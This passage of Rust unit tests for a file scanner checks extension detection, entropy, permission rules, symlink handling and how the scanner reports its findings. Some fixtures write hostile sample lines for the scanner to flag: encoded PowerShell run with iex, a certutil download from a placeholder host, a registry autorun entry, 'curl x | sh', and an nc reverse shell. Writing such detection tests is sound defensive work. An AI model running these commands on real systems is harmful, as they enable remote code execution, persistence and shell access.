    fn test_empty_directory_is_clean() {
        let dir = scratch("empty");
        assert!(scan(&dir).is_empty());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_missing_directory_is_not_a_panic() {
        let dir = scratch("gone");
        let _ = fs::remove_dir_all(&dir);
        assert!(scan(&dir).is_empty());
    }

    #[test]
    fn test_executable_candidates_walks_the_whole_tree() {
        let dir = scratch("candidates");
        write(&dir, "README.md", "docs\n");
        let inner = write(&dir, "bin/tool.exe", "MZ");
        let outer = write(&dir, "tool.exe", "MZ");

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&inner, fs::Permissions::from_mode(0o755)).unwrap();
            fs::set_permissions(&outer, fs::Permissions::from_mode(0o755)).unwrap();
        }

        let candidates = executable_candidates(&dir);
        assert_eq!(candidates.len(), 2);
        assert!(candidates.iter().all(|path| path.starts_with(&dir)));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_windows_executable_extensions() {
        for name in ["tool.exe", "TOOL.EXE", "run.bat", "run.Cmd"] {
            assert!(
                has_windows_executable_extension(Path::new(name)),
                "{} should be runnable on Windows",
                name
            );
        }
        for name in ["README.md", "tool", "lib.dll", "script.ps1", "noext"] {
            assert!(
                !has_windows_executable_extension(Path::new(name)),
                "{} should not be picked as the runnable artifact",
                name
            );
        }
    }

    #[test]
    fn test_windows_script_dialects_are_read_as_text() {
        for name in ["setup.ps1", "mod.psm1", "go.bat", "go.cmd", "s.vbs", "s.js"] {
            assert!(
                has_script_extension(Path::new(name)),
                "{} should be scanned as a script",
                name
            );
        }
    }

    #[test]
    fn test_windows_payload_patterns_fire_from_any_host() {
        // The rule table is shared across platforms, so the PowerShell and
        // batch patterns are exercised wherever the tests run.
        let dir = scratch("windows_rules");
        write(
            &dir,
            "a.ps1",
            "$b=[Convert]::FromBase64String($x)\niex ([Text.Encoding]::UTF8.GetString($b))\n",
        );
        write(
            &dir,
            "b.cmd",
            "certutil.exe -urlcache -split -f http://x.test/p p\r\n",
        );
        write(
            &dir,
            "c.bat",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v t /d p.exe /f\r\n",
        );
        write(
            &dir,
            "d.ps1",
            "powershell.exe -NoProfile -enc SQBFAFgAIAAoAA==\n",
        );

        let findings = scan(&dir);
        assert!(has_blocking(&findings));
        let flagged: Vec<String> = findings
            .iter()
            .map(|f| f.path.display().to_string())
            .collect();
        for name in ["a.ps1", "b.cmd", "c.bat", "d.ps1"] {
            assert!(
                flagged.iter().any(|p| p == name),
                "{} was not flagged",
                name
            );
        }
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_executable_candidates_of_a_missing_dir_is_empty() {
        let dir = scratch("nocandidates");
        let _ = fs::remove_dir_all(&dir);
        assert!(executable_candidates(&dir).is_empty());
    }

    #[test]
    fn test_shannon_entropy_bounds() {
        assert_eq!(shannon_entropy(&[]), 0.0);
        assert_eq!(shannon_entropy(&[7u8; 100]), 0.0);
        let all: Vec<u8> = (0..=255u8).collect();
        assert!((shannon_entropy(&all) - 8.0).abs() < 1e-9);
    }

    #[test]
    fn test_printable_strings_keeps_long_runs_only() {
        let extracted = printable_strings(b"ab\x00longenoughstring\x00cd");
        assert!(extracted.contains("longenoughstring"));
        assert!(!extracted.contains("ab"));
    }

    #[test]
    fn test_looks_binary_detects_a_nul_byte() {
        assert!(looks_binary(b"text\x00more"));
        assert!(!looks_binary(b"pure text"));
    }

    #[test]
    fn test_finding_describe_and_json() {
        let finding = ScanFinding {
            path: PathBuf::from("bin/go.sh"),
            rule: ScanRule::SuspiciousPayload,
            severity: ScanSeverity::Block,
            evidence: "curl x | sh".to_string(),
        };
        assert_eq!(
            finding.describe(),
            "block [suspicious-payload] bin/go.sh — curl x | sh"
        );
        let json = finding.to_json();
        assert_eq!(json["rule"], "suspicious-payload");
        assert_eq!(json["severity"], "block");
        assert_eq!(json["evidence"], "curl x | sh");
    }

    #[test]
    fn test_rule_and_severity_labels() {
        assert_eq!(ScanRule::HighEntropy.label(), "high-entropy");
        assert_eq!(ScanRule::UnsafePermissions.label(), "unsafe-permissions");
        assert_eq!(
            ScanRule::VirusTotalDetection.label(),
            "virustotal-detection"
        );
        assert_eq!(ScanSeverity::Warn.label(), "warn");
    }

    #[cfg(unix)]
    #[test]
    fn test_setuid_file_blocks() {
        use std::os::unix::fs::PermissionsExt;

        let dir = scratch("setuid");
        let path = write(&dir, "helper", "#!/bin/sh\necho hi\n");
        fs::set_permissions(&path, fs::Permissions::from_mode(0o4755)).unwrap();

        let findings = scan(&dir);
        assert!(has_blocking(&findings));
        assert!(findings
            .iter()
            .any(|f| f.rule == ScanRule::UnsafePermissions));
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn test_world_writable_file_warns() {
        use std::os::unix::fs::PermissionsExt;

        let dir = scratch("worldwrite");
        let path = write(&dir, "data.txt", "hello\n");
        fs::set_permissions(&path, fs::Permissions::from_mode(0o666)).unwrap();

        let findings = scan(&dir);
        assert!(!has_blocking(&findings));
        assert!(findings
            .iter()
            .any(|f| f.rule == ScanRule::UnsafePermissions));
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(unix)]
    #[test]
    fn test_symlinks_are_not_followed_out_of_the_tree() {
        let dir = scratch("symlink");
        let outside = scratch("symlink_target");
        write(&outside, "evil.sh", "#!/bin/sh\nnc -e /bin/sh 1.2.3.4 9\n");
        std::os::unix::fs::symlink(&outside, dir.join("link")).unwrap();

        assert!(scan(&dir).is_empty());
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&outside);
    }
}
